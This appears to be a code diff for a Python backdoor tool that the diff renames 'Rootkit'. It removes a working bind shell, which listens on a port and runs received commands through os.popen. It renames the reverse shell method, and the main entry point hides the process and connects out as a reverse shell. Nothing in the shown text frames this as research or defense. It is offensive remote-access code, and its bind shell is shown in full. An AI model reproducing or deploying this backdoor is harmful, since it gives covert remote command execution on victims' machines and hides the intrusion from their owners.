@@ -12,7 +12,7 @@ import signal
 from time import sleep
 
 
-class Backdoor:
+class Rootkit:
 
 	def relaunch(self, signal, frame):
 		cmd = sys.argv
@@ -37,33 +37,8 @@ class Backdoor:
 		return sock.send("[{0}]> ".format(data))
 
 
-	def bind_shell(self, host=None, port=None):
-
-		assert type(host) == str
-
-		if port is None:
-			port = int(44134)
-
-		sleep(5)
-
-		try:
-			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			sock.bind((host,port))
-			sock.listen(100)
-			while True:
-				client, address = sock.accept()
-				while True:
-					command = client.recv(1024).encode("UTF-8")
-					result = os.popen(command).read()
-					client.send(result)
-					self.shell_text_interupt(client, host)
-
-		except Exception as error:
-			print "[-] Failed to create socket: {0}".format(str(error))
-
-
 	# Default connection port is 44134
-	def connect_as_reverse_shell(self, host=None, port=None):
+	def reverse_shell(self, host=None, port=None):
 
 		if host is None:
 			return 0
@@ -104,7 +79,6 @@ class Backdoor:
 		return 0
 
 if __name__ == '__main__':
-	bd = Backdoor()
-	bd.hide_process()
-	bd.bind_shell(sys.argv[1], int(sys.argv[2]))
-	bd.connect_as_reverse_shell(str(sys.argv[1]), int(sys.argv[2]))
+	rk = Rootkit()
+	rk.hide_process()
+	rk.reverse_shell(str(sys.argv[1]), int(sys.argv[2]))
